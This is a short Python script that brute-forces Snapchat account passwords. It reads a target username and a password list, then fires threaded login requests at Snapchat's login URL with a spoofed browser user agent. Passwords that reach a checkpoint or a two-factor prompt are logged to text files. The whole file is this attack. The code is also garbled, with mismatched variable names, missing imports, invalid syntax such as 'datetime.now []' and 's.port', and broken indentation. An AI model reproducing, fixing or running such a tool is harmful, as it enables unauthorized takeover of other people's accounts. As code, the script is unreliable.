from __future__ import absolute_import
from __future__ import print_function
import requests
import os
import threading
import sys
import random

CheckVer = str (sys.version)
import re
from datetime import datetime

class Snap (object):
	def __init__(self):
		try:
			user = input ('Enter Username: ')
			Multi = input ('Enter Password: ')
			print("\n")
		except:
			print('Failed To Load')
			sys.exit()

		with open(Multi, 'r') as x:
			MutliList = x.read ().splitlines()
			thread = []
			self.Coutprox = 0
			for Multi in MutliList:
				passwd = multi.split (':')[0]
				t = threading.Thread(target=self.enter_br, args=(user, passwd))
				t.start ()
				thread.append (t)
				time.sleep (0.6)
				for j in thread:
					j.join()
		def cls(self):
			linux = 'clear'
			os.system ([linux][os.name == 'nt'])

		def enter_br(self, user, pwd):
			link = 'https://accounts.snapchat.com/accounts/login'
			login_url = 'https://accounts.snapchat.com/accounts/login'
			time = int (datetime.now [].timestamp())
				payload = {
				'usrname' : user,
				'enc_password': f'#PWD_SNAPCHAT_BROWSER:0:{time}:{pwd}',
				}
			with requests.Session() as s:
				r = s.get (link)
				r = s.port(login_url, data=payload, headers={
					 "user-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://accounts.snapchat.com/accounts/login"
					})
				if 'checkpoint_url' in r.text:
					print (('' + user + ':' + pwd + ''))
					with open('passlist.txt', 'a') as x:
						x.write(user + pwd + '\n')
				elif 'two_factor_required' in r.text:
					with open('NeedToVerify.txt', 'a') as x:
						x.write(user + pwd + '\n')
Snap()
